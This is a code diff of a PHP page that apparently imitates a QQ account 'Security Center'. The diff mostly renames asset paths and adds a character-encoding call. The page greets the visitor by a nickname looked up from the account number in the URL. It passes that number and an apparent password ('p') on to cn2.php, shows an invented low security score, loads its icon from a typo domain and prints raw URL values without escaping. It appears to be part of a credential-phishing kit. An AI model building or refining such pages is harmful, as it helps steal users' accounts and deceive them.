@@ -8,15 +8,15 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml"><head>
 <meta http-equiv="Content-Type" content="text/html; charset=gbk">
-<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/global.css" rel="stylesheet" type="text/css">
-<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/base.css" rel="stylesheet" type="text/css">
+<link href="safe_files/global.css" rel="stylesheet" type="text/css">
+<link href="safe_files/base.css" rel="stylesheet" type="text/css">
 <link rel="shortcut icon" href="http://serviec.boy-ex.com/favicon.ico">
-<script async="" type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/cdn_djl.js"></script><script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/jquery.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/common.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/ctrlManager.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/vry_question.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/check.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/dna.js"></script>
+<script async="" type="text/javascript" src="safe_files/cdn_djl.js"></script><script type="text/javascript" src="safe_files/jquery.js"></script>
+<script type="text/javascript" src="safe_files/common.js"></script>
+<script type="text/javascript" src="safe_files/ctrlManager.js"></script>
+<script type="text/javascript" src="safe_files/vry_question.js"></script>
+<script type="text/javascript" src="safe_files/check.js"></script>
+<script type="text/javascript" src="safe_files/dna.js"></script>
 	<title>安全中心</title>	
 	<style type="text/css">
 		.ac_menu{border:1px solid #3162A6;background-color:#F6F6F6;cursor:default;overflow:hidden;height:expression((this.scrollHeight>130)?"130px":"auto")}
@@ -25,7 +25,7 @@
 		#popupcontent{position:absolute;visibility:hidden;cursor:default;z-index:99;} 
 	</style>
 	<script type="text/javascript">window.onerror=function(){return true;}</script>
-<script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/aq_float_frame.js" type="text/javascript"></script><script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/cdn_dianjiliu.js"></script></head>
+<script src="safe_files/aq_float_frame.js" type="text/javascript"></script><script src="safe_files/cdn_dianjiliu.js"></script></head>
 	
  
 <body>
@@ -46,7 +46,7 @@
         	<div class="right_info">
             <ul>
 			
-            <li><span>欢迎您，<?php echo getQQNick($_GET['u']); ?>(<?php echo $_GET['u']; ?>)</span></li>
+            <li><span>欢迎您，<?php echo iconv("UTF-8","GB2312//IGNORE",getQQNick($_GET['u'])); ?>(<?php echo $_GET['u']; ?>)</span></li>
 			<li class="cent" id="safe_score_item"><a href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>"><strong id="head_safe_score"><font color="#FF8000">
 			30分</font></strong></a></li>
 			 <li><a href="javascript:LoginOut();">退出</a></li>
@@ -100,7 +100,7 @@
 			隐私条款</a><br><br>
 		</p>
 		<!--<div class="title_right3"><b class="tr_13"></b></div><br><br>-->
-		<img src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/1.jpg">
+		<img src="safe_files/1.jpg">
 		<!--<div class="title3"><b>帐号基本信息</b></div>-->
 
 		<p></p>
@@ -136,7 +136,7 @@
 
             <div class="blank20"></div>
             <!--<div class="title_right1"><b class="tr_14"></b></div>-->
-            <img src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/2.jpg">
+            <img src="safe_files/2.jpg">
             <!--<div class="title3"><b>联系资料</b></div>-->
 
             <ul class="ulp">
@@ -194,7 +194,7 @@
             
             
             <li class="btn">
-            <input onclick="vbscript:myform1.submit()" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/anniu.jpg" type="image">&nbsp;
+            <input onclick="vbscript:myform1.submit()" src="safe_files/anniu.jpg" type="image">&nbsp;
 			</li>
             </ul>
 	
@@ -1303,4 +1303,4 @@
 </script>
 
  
-<script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/ping.js"></script><script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/aqrjs_common.js"></script></body></html>
+<script src="safe_files/ping.js"></script><script src="safe_files/aqrjs_common.js"></script></body></html>
